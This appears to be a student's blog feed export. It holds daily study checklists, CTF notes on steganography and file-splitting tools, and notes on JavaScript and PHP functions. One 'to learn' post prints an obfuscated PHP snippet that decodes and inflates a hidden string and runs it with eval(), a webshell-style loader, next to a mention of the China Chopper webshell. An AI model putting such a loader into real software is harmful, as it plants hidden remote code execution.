<h2 id="2020-01-12总结"><a href="#2020-01-12总结" class="headerlink" title="2020-01-12总结"></a>2020-01-12总结</h2><ol>
<li>看完了正则表达式第三章</li>
<li>整理了两个JS函数</li>
<li>kali的虚拟机一直安不好。。。明天再试试</li>
<li>b站图片隐写看完，明天整理发博客</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>Y</td>
</tr>
<tr>
<td>早上9：00前起床</td>
<td>N</td>
</tr>
<tr>
<td>高数定积分&amp;&amp;不定积分</td>
<td>N</td>
</tr>
<tr>
<td>b站题型介绍看完</td>
<td>Y</td>
</tr>
<tr>
<td>正则表达式第三章</td>
<td>Y</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>Y</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>图像的隐写</title>
    <url>/2020/01/13/%E5%9B%BE%E5%83%8F%E7%9A%84%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<h2 id="查看gif每一帧"><a href="#查看gif每一帧" class="headerlink" title="查看gif每一帧"></a>查看gif每一帧</h2><ol>
<li>fireworks</li>
<li>photoshop</li>
</ol>
<h2 id="查看exif"><a href="#查看exif" class="headerlink" title="查看exif"></a>查看exif</h2><p>右键属性可查看（有些隐藏信息储存其中）</p>
<h2 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h2><ol>
<li><p>有两张几乎相同的图片，利用此软件进行两张图片的加，减，亦或。</p>
<p><em>进行减时两张图片的先后顺序有差别！</em></p>
</li>
<li><p>显示图片的一些颜色通道</p>
</li>
<li><p>data extract调整有关参数获取flag</p>
</li>
</ol>
<h2 id="zsteg（检测LSB隐写）"><a href="#zsteg（检测LSB隐写）" class="headerlink" title="zsteg（检测LSB隐写）"></a>zsteg（检测LSB隐写）</h2><p><em>在linux下运行</em></p>
<p><em>能检测png，jpg格式</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg xxx.png</span><br></pre></td></tr></table></figure>

<h2 id="wbstego4工具"><a href="#wbstego4工具" class="headerlink" title="wbstego4工具"></a>wbstego4工具</h2><p>可检测bmp，rle，txt，asc，html，xml，pdf格式</p>
<h2 id="写python脚本跑"><a href="#写python脚本跑" class="headerlink" title="写python脚本跑"></a>写python脚本跑</h2><p>本人暂时不会</p>
<h2 id="tweakPNG"><a href="#tweakPNG" class="headerlink" title="tweakPNG"></a>tweakPNG</h2><p>可识别出png错误的CRC并给出正确值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRC：每个png图像头部均为：图像头、长度、宽度、高度、CRC组成，CRC本身错误和高度错误都会导致CRC值的错误</span><br></pre></td></tr></table></figure>

<p><img src="/2020/01/13/%E5%9B%BE%E5%83%8F%E7%9A%84%E9%9A%90%E5%86%99/2.jpg" alt="2"></p>
<h3 id="利用tweakPNG所给值改CRC"><a href="#利用tweakPNG所给值改CRC" class="headerlink" title="利用tweakPNG所给值改CRC"></a>利用tweakPNG所给值改CRC</h3><p>可用010editor或winhex打开16进制</p>
<h3 id="跑一个python脚本求出正确高度"><a href="#跑一个python脚本求出正确高度" class="headerlink" title="跑一个python脚本求出正确高度"></a>跑一个python脚本求出正确高度</h3><p><img src="/2020/01/13/%E5%9B%BE%E5%83%8F%E7%9A%84%E9%9A%90%E5%86%99/1.jpg" alt="1"></p>
<h2 id="btftools"><a href="#btftools" class="headerlink" title="btftools"></a>btftools</h2><p><strong>使用场景：windows下的cmd，对加密过的图片进行解密</strong></p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">btftools.exe decode braincopter 要解密图片名称 -output 输出文件名</span><br><span class="line">btftools.exe run 上一步输出的文件</span><br></pre></td></tr></table></figure>



<h2 id="silenteye"><a href="#silenteye" class="headerlink" title="silenteye"></a>silenteye</h2><p>可以将文字或文件隐藏到图片</p>
<h2 id="jpg图像加密"><a href="#jpg图像加密" class="headerlink" title="jpg图像加密"></a>jpg图像加密</h2><h3 id="stegdetect工具检测加密方式"><a href="#stegdetect工具检测加密方式" class="headerlink" title="stegdetect工具检测加密方式"></a>stegdetect工具检测加密方式</h3><p>主要用于分析jpg文件，可以检测到通过steg，JPHide，OutGuess，invisib Secrets，F5，appendX，camouflage等隐写工具隐藏的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stegdetect xxx.jpg</span><br><span class="line">stegdetect -s(敏感度) xxx.jpg</span><br></pre></td></tr></table></figure>



<h3 id="JPhide（图形界面）"><a href="#JPhide（图形界面）" class="headerlink" title="JPhide（图形界面）"></a>JPhide（图形界面）</h3><p>基于最低有效位LSB的JPG图像隐写算法</p>
<h3 id="Outguess"><a href="#Outguess" class="headerlink" title="Outguess"></a>Outguess</h3><p><strong>该工具要编译使用：./configure &amp;&amp; make &amp;&amp; make install</strong></p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">outguess -r 要解密的文件名 输出结果文件名</span><br></pre></td></tr></table></figure>



<h3 id="F5"><a href="#F5" class="headerlink" title="F5"></a>F5</h3><p>进入F5-steganography_F5目录，将图片文件拷贝至该目录下，从cmd进入该目录</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java Extact 要解密的文件名 -p 密码</span><br></pre></td></tr></table></figure>



<h2 id="二维码处理"><a href="#二维码处理" class="headerlink" title="二维码处理"></a>二维码处理</h2><ol>
<li>补全</li>
<li>取反</li>
<li>stegsolve颜色通道</li>
</ol>
]]></content>
      <categories>
        <category>ctf技巧</category>
      </categories>
  </entry>
  <entry>
    <title>toUpperCase()/to LowerCase()方法 [把字符串转换为大/小写]</title>
    <url>/2020/01/12/toUpperCase-to-LowerCase-%E6%96%B9%E6%B3%95-%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%A4%A7-%E5%B0%8F%E5%86%99/</url>
    <content><![CDATA[<h2 id="toUpperCase"><a href="#toUpperCase" class="headerlink" title="toUpperCase()"></a>toUpperCase()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>toUpperCase() 方法用于把字符串转换为大写</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.toUpperCase()</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var txt&#x3D;&quot;Runoob&quot;;</span><br><span class="line">document.write(txt.toLowerCase() + &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(txt.toUpperCase());</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob</span><br><span class="line">RUNOOB</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS split()方法 [将字符串分割成字符串数组]</title>
    <url>/2020/01/12/JS-split-%E6%96%B9%E6%B3%95-%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E5%89%B2%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="split"><a href="#split" class="headerlink" title="split()"></a>split()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>split() 方法用于把一个字符串分割成字符串数组。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.split(separator,limit)</span><br></pre></td></tr></table></figure>

<h3 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h3><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>separator</td>
<td>可选。字符串或正则表达式，从该参数指定的地方分割 string Object。</td>
</tr>
<tr>
<td>limit</td>
<td>可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。</td>
</tr>
</tbody></table>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Array</td>
<td>一个字符串数组。该数组是通过在 separator 指定的边界处将字符串 string Object 分割成子串创建的。返回的数组中的字串不包括 separator 自身。</td>
</tr>
</tbody></table>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="省略“separator”参数"><a href="#省略“separator”参数" class="headerlink" title="省略“separator”参数"></a>省略“separator”参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;How are you doing today?&quot;;</span><br><span class="line">var n&#x3D;str.split();</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">How are you doing today?</span><br></pre></td></tr></table></figure>



<h4 id="“separator”参数为””"><a href="#“separator”参数为””" class="headerlink" title="“separator”参数为””"></a>“separator”参数为””</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;How are you doing today?&quot;;</span><br><span class="line">var n&#x3D;str.split(&quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>结果分割每个字符，包括空格:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">H,o,w, ,a,r,e, ,y,o,u, ,d,o,i,n,g, ,t,o,d,a,y,?</span><br></pre></td></tr></table></figure>



<h4 id="使用“limit“参数"><a href="#使用“limit“参数" class="headerlink" title="使用“limit“参数"></a>使用“limit“参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;How are you doing today?&quot;;</span><br><span class="line">var n&#x3D;str.split(&quot; &quot;,3);</span><br></pre></td></tr></table></figure>

<p>结果将输出3个数组的值:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">How,are,you</span><br></pre></td></tr></table></figure>



<h4 id="使用一个字符作为分隔符"><a href="#使用一个字符作为分隔符" class="headerlink" title="使用一个字符作为分隔符:"></a>使用一个字符作为分隔符:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;How are you doing today?&quot;;</span><br><span class="line">var n&#x3D;str.split(&quot;o&quot;);</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">H,w are y,u d,ing t,day?</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-12日目标</title>
    <url>/2020/01/12/2020-01-12%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-12目标"><a href="#2020-01-12目标" class="headerlink" title="2020-01-12目标"></a>2020-01-12目标</h2><ol>
<li>听力10min+单词10个</li>
<li>早上9：00前起床</li>
<li>高数定积分&amp;&amp;不定积分</li>
<li>b站题型介绍看完</li>
<li>正则表达式第三章</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-11总结"><a href="#2020-01-11总结" class="headerlink" title="2020-01-11总结"></a>2020-01-11总结</h2><ol>
<li>更新了Ubuntu，更换了apt源</li>
<li>下午复习了高数第二三单元</li>
<li>总结了ctf文件的合并与分离</li>
<li>解决了github hexo图片无法成功上传的问题</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>N</td>
</tr>
<tr>
<td>正则表达式第三章</td>
<td>N</td>
</tr>
<tr>
<td>下午复习高数</td>
<td>Y</td>
</tr>
<tr>
<td>b站题型介绍看完</td>
<td>N</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>N</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>文件的合并与分离</title>
    <url>/2020/01/11/%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%86%E7%A6%BB/</url>
    <content><![CDATA[<h2 id="文件的类型"><a href="#文件的类型" class="headerlink" title="文件的类型"></a>文件的类型</h2><h3 id="file命令"><a href="#file命令" class="headerlink" title="file命令"></a>file命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file filename</span><br></pre></td></tr></table></figure>

<p><strong><em>注：若使用file命令显示类型为data，则可能出现了文件头缺失，可自行打开“010editor”修改文件头。</em></strong></p>
<h3 id="不同文件有不同文件头"><a href="#不同文件有不同文件头" class="headerlink" title="不同文件有不同文件头"></a>不同文件有不同文件头</h3><p><img src="/2020/01/11/%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%86%E7%A6%BB/fileHead.png" alt></p>
<h2 id="文件的分离"><a href="#文件的分离" class="headerlink" title="文件的分离"></a>文件的分离</h2><h3 id="binwalk工具-自动"><a href="#binwalk工具-自动" class="headerlink" title="binwalk工具(自动)"></a>binwalk工具(自动)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分析文件：binwalk filename</span><br><span class="line">分离文件：binwalk -e filename</span><br></pre></td></tr></table></figure>



<h3 id="foremost-自动"><a href="#foremost-自动" class="headerlink" title="foremost(自动)"></a>foremost(自动)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost filename -o outputFilename</span><br></pre></td></tr></table></figure>



<h3 id="dd-半自动半手动分离"><a href="#dd-半自动半手动分离" class="headerlink" title="dd(半自动半手动分离)"></a>dd(半自动半手动分离)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;输入的文件名 of&#x3D;输出的文件名 bs&#x3D;设置读写块的大小 copy&#x3D;一共读取几个读写快 slip&#x3D;跳过几个读写快开始读取</span><br></pre></td></tr></table></figure>



<p>比如对”1.txt”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1234567890abcde</span><br></pre></td></tr></table></figure>

<p>实施命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;1.txt of &#x3D;2.txt bs&#x3D;5 count&#x3D;3 skip&#x3D;1</span><br></pre></td></tr></table></figure>

<p>会得到”2.txt”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">67890abcde</span><br></pre></td></tr></table></figure>



<h3 id="010editor-半自动半手动"><a href="#010editor-半自动半手动" class="headerlink" title="010editor(半自动半手动)"></a>010editor(半自动半手动)</h3><p>找出想分离的部分，右键并点击”save selection”.</p>
<h2 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h2><h3 id="linux下的文件合并"><a href="#linux下的文件合并" class="headerlink" title="linux下的文件合并"></a>linux下的文件合并</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat file1 file2 file3 &gt; outputFilename</span><br></pre></td></tr></table></figure>

<p>完整性检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum filename</span><br></pre></td></tr></table></figure>



<h3 id="windows下的文件合并"><a href="#windows下的文件合并" class="headerlink" title="windows下的文件合并"></a>windows下的文件合并</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy &#x2F;B file1+file2+file3 outputFilename</span><br></pre></td></tr></table></figure>

<p>完整性检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -hashfile filename md5</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf技巧</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-11日目标</title>
    <url>/2020/01/10/2020-01-11%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-11日目标"><a href="#2020-01-11日目标" class="headerlink" title="2020-01-11日目标"></a>2020-01-11日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>正则表达式第三章</li>
<li>下午复习高数</li>
<li>b站题型介绍看完</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-10总结"><a href="#2020-01-10总结" class="headerlink" title="2020-01-10总结"></a>2020-01-10总结</h2><ol>
<li>安装好了VMware Workstation</li>
<li>忙完了正则表达式第二章</li>
<li>JS函数部分看完</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>N</td>
</tr>
<tr>
<td>正则表达式第二章</td>
<td>Y</td>
</tr>
<tr>
<td>下午复习高数</td>
<td>N</td>
</tr>
<tr>
<td>JS函数部分看完</td>
<td>Y</td>
</tr>
<tr>
<td>b站题型介绍看完</td>
<td>N</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>N</td>
</tr>
<tr>
<td>状态</td>
<td>N</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-10日目标</title>
    <url>/2020/01/10/2020-01-10%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-10日目标"><a href="#2020-01-10日目标" class="headerlink" title="2020-01-10日目标"></a>2020-01-10日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>正则表达式第二章</li>
<li>下午复习高数</li>
<li>JS函数部分看完</li>
<li>b站题型介绍看完</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-09总结"><a href="#2020-01-09总结" class="headerlink" title="2020-01-09总结"></a>2020-01-09总结</h2><ol>
<li>安装好了python</li>
<li>大致浏览了JS函数有关内容，但是还要继续巩固</li>
<li>看了一会b站ctf</li>
<li>打了排球</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>N</td>
</tr>
<tr>
<td>南邮ctf 深入研究 文件包含</td>
<td>N</td>
</tr>
<tr>
<td>Js函数部分</td>
<td>N</td>
</tr>
<tr>
<td>看b站ctf概览建立一个框架</td>
<td>N</td>
</tr>
<tr>
<td>安装好python环境</td>
<td>Y</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>N</td>
</tr>
<tr>
<td>状态</td>
<td>N</td>
</tr>
</tbody></table>
<p><strong><u>不想通过打分让自己觉得虽然没有完成但至少做了一点，从这次开始总结只有Y/N。哪怕只差一点也是没有完成。</u></strong></p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-09日目标</title>
    <url>/2020/01/09/2020-01-09%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-09日目标"><a href="#2020-01-09日目标" class="headerlink" title="2020-01-09日目标"></a>2020-01-09日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>南邮ctf 深入研究 文件包含</li>
<li>Js函数部分</li>
<li>看b站ctf概览建立一个框架</li>
<li>安装好python环境</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-08总结"><a href="#2020-01-08总结" class="headerlink" title="2020-01-08总结"></a>2020-01-08总结</h2><ol>
<li>买了前年的高数卷子，复习了高数第二单元</li>
<li>完成了南邮ctf 文件包含</li>
<li>在做文件包含时发现自己学的知识有些杂有些乱，所以想找一些ctf概览的视频明确一下方向</li>
<li>安装了几个有用工具和java环境</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>5</td>
</tr>
<tr>
<td>南邮ctf 文件包含</td>
<td>8</td>
</tr>
<tr>
<td>复习高数第二单元</td>
<td>10</td>
</tr>
<tr>
<td>Js函数部分</td>
<td>0</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>10</td>
</tr>
<tr>
<td>状态</td>
<td>7</td>
</tr>
</tbody></table>
<p>ps: 2020-01-07考完英语完全放松了一天，所以那一天的计划是空白。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-07日目标</title>
    <url>/2020/01/06/2020-01-07%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-07日目标"><a href="#2020-01-07日目标" class="headerlink" title="2020-01-07日目标"></a>2020-01-07日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>9:30在2206考大英1</li>
<li>南邮ctf 文件包含</li>
<li>复习高数第二单元</li>
<li>Js函数部分</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-06总结"><a href="#2020-01-06总结" class="headerlink" title="2020-01-06总结"></a>2020-01-06总结</h2><ol>
<li>把英语段落翻译看了，做了几篇新闻</li>
<li>复习了第一单元高数，还要多见见极限的题型</li>
<li>看完了JS基础部分</li>
<li>南邮ctf 单身二十年 &amp;&amp; decode</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>5</td>
</tr>
<tr>
<td>继续学习完善正则表达式</td>
<td>0</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></td>
<td>10</td>
</tr>
<tr>
<td>花一点时间备考大英1</td>
<td>9</td>
</tr>
<tr>
<td>南邮ctf  <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">单身二十年</a></td>
<td>10</td>
</tr>
<tr>
<td>晚上1:00前睡觉</td>
<td>10</td>
</tr>
<tr>
<td>状态</td>
<td>8</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php eval()函数 [把字符串作为PHP代码执行]</title>
    <url>/2020/01/06/php-eval-%E5%87%BD%E6%95%B0-%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%9C%E4%B8%BAPHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>把字符串作为PHP代码执行</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(phpcode)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$string &#x3D; &#39;cup&#39;;</span><br><span class="line">$name &#x3D; &#39;coffee&#39;;</span><br><span class="line">$str &#x3D; &#39;This is a $string with my $name in it.&#39;;</span><br><span class="line">echo $str. &quot;\n&quot;;</span><br><span class="line">eval(&quot;\$str &#x3D; \&quot;$str\&quot;;&quot;);</span><br><span class="line">echo $str. &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a cup with my coffee in it.</span><br></pre></td></tr></table></figure>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li>eval函数的参数的字符串末尾一定要有分号，在最后还要另加一个分号（这个分号是php限制）。</li>
<li>注意单引号，双引号和反斜杠的运用。如果参数中带有变量时,并且变量有赋值操作的话，变量前的$符号钱一定要有\来转义。如果没有赋值操作可以不需要。</li>
<li>注意在命令式字符串（包括分号）两边必须要有双引号或者根据需要用单引号。否则报错。 命令式字符串是指：字符串中包括echo、print之类的命令的时候。 如果参数只有一个变量则可以不用。</li>
</ol>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;test eval function&quot;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS push()/unshift()函数 [在数组末尾/起始加新元素并返回新长度]</title>
    <url>/2020/01/06/JS-push-%E5%87%BD%E6%95%B0-%E5%9C%A8%E6%95%B0%E7%BB%84%E6%9C%AB%E5%B0%BE%E5%8A%A0%E6%96%B0%E5%85%83%E7%B4%A0%E5%B9%B6%E8%BF%94%E5%9B%9E%E6%96%B0%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="push"><a href="#push" class="headerlink" title="push()"></a>push()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>push() 方法可向数组的末尾添加一个或多个元素，并返回新的长度</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array.push(item1,item2,...,itemX)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fruits &#x3D; [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];</span><br><span class="line">y&#x3D;fruits.push(&quot;Kiwi&quot;,&quot;Lemon&quot;,&quot;Pineapple&quot;)</span><br><span class="line">alert(y);</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Banana,Orange,Apple,Mango,Kiwi,Lemon,Pineapple</span><br><span class="line">有一个弹窗显示&quot;7&quot;</span><br></pre></td></tr></table></figure>



<h2 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h2><p><em>与push()基本相同，只不过是把新元素添到数组开头并返回数组长度。</em></p>
]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS call()/apply()/bind()函数 [强制重新定义this对象]</title>
    <url>/2020/01/06/JS-call-apply-bind-%E5%87%BD%E6%95%B0-%E5%BC%BA%E5%88%B6%E9%87%8D%E6%96%B0%E5%AE%9A%E4%B9%89this%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p>这个哥们讲得超棒，就引用哈 <a href="https://www.runoob.com/w3cnote/js-call-apply-bind.html" target="_blank" rel="noopener">他的文章</a>！</p>
]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>一些学习中遇到可学却还没来得及学的东西</title>
    <url>/2020/01/06/%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0%E4%B8%AD%E9%81%87%E5%88%B0%E5%8F%AF%E5%AD%A6%E5%8D%B4%E8%BF%98%E6%B2%A1%E6%9D%A5%E5%BE%97%E5%8F%8A%E5%AD%A6%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
    <content><![CDATA[<ol>
<li><p><a href="https://www.runoob.com/html/html5-form-attributes.html" target="_blank" rel="noopener">HTML表单属性</a></p>
</li>
<li><p><a href="https://www.runoob.com/css/css-pseudo-classes.html" target="_blank" rel="noopener">CSS伪类</a></p>
</li>
<li><pre><code>&lt;?php
function CLsI($ZzvSWE) {

    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));

    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) {

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    }

    return $ZzvSWE;

}
eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));
?&gt;</code></pre></li>
<li><p>看b站视频大致了解pwn和逆向</p>
</li>
<li><p>中国菜刀调试</p>
</li>
<li><p>DVWA csp bypass high级别理解</p>
</li>
<li><p>等额本息偿付</p>
</li>
<li><p>c语言反编译数组和指针查看其区别</p>
</li>
</ol>
<h1 id="已学"><a href="#已学" class="headerlink" title="已学"></a>已学</h1><ol>
<li>抓包技术</li>
<li>菜鸟php与ajax</li>
</ol>
]]></content>
      <tags>
        <tag>杂七杂八</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-06日目标</title>
    <url>/2020/01/06/2020-01-06%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-06日目标"><a href="#2020-01-06日目标" class="headerlink" title="2020-01-06日目标"></a>2020-01-06日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>继续学习完善正则表达式</li>
<li><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></li>
<li>花一点时间备考大英1</li>
<li>南邮ctf  <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">单身二十年</a></li>
<li>晚上1:00前睡觉</li>
</ol>
